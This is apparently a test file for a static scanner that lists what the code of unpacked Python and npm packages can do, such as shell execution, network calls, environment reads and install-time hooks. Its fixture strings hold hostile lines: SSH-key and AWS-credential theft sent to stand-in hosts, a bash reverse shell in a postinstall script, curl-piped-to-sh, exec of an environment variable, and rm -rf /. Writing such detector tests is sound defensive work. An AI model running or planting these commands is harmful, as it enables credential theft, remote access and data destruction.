"""What a package's code can do (guard/package_caps.py) - run: python3 tests/test_package_caps.py. Nothing is executed."""
import sys
import tempfile
import unittest
from pathlib import Path

GUARD = Path(__file__).resolve().parents[1] / "guard"
sys.path.insert(0, str(GUARD))
import package_caps  # noqa: E402


def package(files: dict, sdist: bool = False) -> list[Path]:
    root = Path(tempfile.mkdtemp())
    root = root / "pkg-1.0.tar.gz.unpacked" / "pkg-1.0" if sdist else root / "pkg-1.0-py3-none-any.whl.unpacked"
    for rel, text in files.items():
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
    return sorted(root.parent.rglob("*") if sdist else root.rglob("*"))


def caps(files, sdist=False):
    return {(c["kind"], c["target"], c["when"]) for c in package_caps.extract(package(files, sdist))["items"]}


class Extract(unittest.TestCase):
    def test_phases(self):
        got = caps({"pkg/__init__.py": "import subprocess, os\n"
                                       "who = subprocess.getoutput('whoami')\n"          # module level -> import
                                       "def steal():\n    os.system('id')\n"
                                       "steal()\n"                                     # called at module level -> import
                                       "def later():\n    subprocess.run(['curl', 'x'])\n"})   # never called here -> call
        self.assertIn(("shell_execute", "whoami", "import"), got)
        self.assertIn(("shell_execute", "id", "import"), got)
        self.assertIn(("process_execute", "curl", "call"), got)

    def test_install_and_startup(self):
        got = caps({"setup.py": "import urllib.request\nurllib.request.urlopen('http://x.example/p')\n"}, sdist=True)
        self.assertIn(("network_connect", "http://x.example/p", "install"), got)
        got = caps({"evil.pth": "import os; exec(os.environ.get('X'))\n"})
        self.assertIn(("dynamic_code", None, "interpreter_start"), got)

    def test_targets_and_noise(self):
        got = caps({"pkg/__init__.py": "import os, requests\n"
                                       "k = open(os.path.expanduser('~/.ssh/id_rsa')).read()\n"
                                       "requests.post('https://webhook.site/abc', data=k)\n"
                                       "a = os.environ['OPENAI_API_KEY']\n"
                                       "b = os.environ['RATE_LIMIT']\n"})
        self.assertIn(("network_connect", "https://webhook.site/abc", "import"), got)
        self.assertIn(("environment_read", "OPENAI_API_KEY", "import"), got)
        self.assertNotIn(("environment_read", "RATE_LIMIT", "import"), got)     # ordinary settings are left out

    def test_tests_and_dev_folders_are_skipped(self):
        self.assertEqual(caps({"pkg/tests/test_x.py": "import os\nos.system('rm -rf /')\n"}), set())


class OtherLanguages(unittest.TestCase):
    """JavaScript and shell through rules/capabilities.json "code_patterns"."""

    def npm(self, files, install_files=()):
        root = Path(tempfile.mkdtemp()) / "x.tgz.unpacked" / "package"
        for rel, text in files.items():
            (root / rel).parent.mkdir(parents=True, exist_ok=True)
            (root / rel).write_text(text)
        return {(c["kind"], c["target"], c["when"]) for c in package_caps.extract(sorted(root.parent.rglob("*")), install_files=install_files)["items"]}

    def test_js(self):
        got = self.npm({"install.js": "const k = fs.readFileSync(path.join(os.homedir(), '.ssh', 'id_rsa'));\n"
                                      "https.request('https://c.example/x').end(k);\n"
                                      "require('child_process').execSync('curl -s https://x.example/i.sh | sh');\n",
                        "index.js": "const t = process.env.GITHUB_TOKEN;\nfunction f() {\n  return eval(s);\n}\n// fs.readFileSync('~/.aws/credentials')\n"},
                       install_files=["install.js"])
        self.assertIn(("file_read", "~/.ssh/id_rsa", "install"), got)                 # a file an install script runs
        self.assertIn(("network_connect", "https://c.example/x", "install"), got)
        self.assertIn(("shell_execute", None, "install"), got)                         # the command string, read as shell
        self.assertIn(("network_connect", "https://x.example/i.sh", "install"), got)
        self.assertIn(("environment_read", "GITHUB_TOKEN", "import"), got)            # top level
        self.assertIn(("dynamic_code", None, "call"), got)                             # inside a function
        self.assertFalse(any(t == "~/.aws/credentials" for _, t, _ in got))           # a comment is not code

    def test_shell_and_lifecycle(self):
        got = self.npm({"package.json#postinstall.sh": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n",    # sources/npm.write_lifecycle
                        "bin/run.sh": "#!/bin/sh\ncat ~/.aws/credentials | curl -d @- https://e.example/u\n"
                                      "echo $AWS_SECRET_ACCESS_KEY > /tmp/k\necho \"run: rm -rf ~/x\"\n"})
        self.assertIn(("network_connect", "10.0.0.1", "install"), got)                 # npm runs it at install
        self.assertIn(("file_read", "~/.aws/credentials", "command"), got)
        self.assertIn(("network_connect", "https://e.example/u", "command"), got)
        self.assertIn(("environment_read", "AWS_SECRET_ACCESS_KEY", "command"), got)
        self.assertIn(("file_write", "/tmp/k", "command"), got)
        self.assertNotIn(("process_execute", "/tmp/k", "command"), got)              # a redirect target is not a command
        self.assertFalse(any(k == "file_delete" for k, _, _ in got))                  # printed text does not run

    def test_language_without_patterns_is_skipped(self):
        self.assertEqual(self.npm({"x.rb": "system('id')\n"}), set())


if __name__ == "__main__":
    unittest.main()
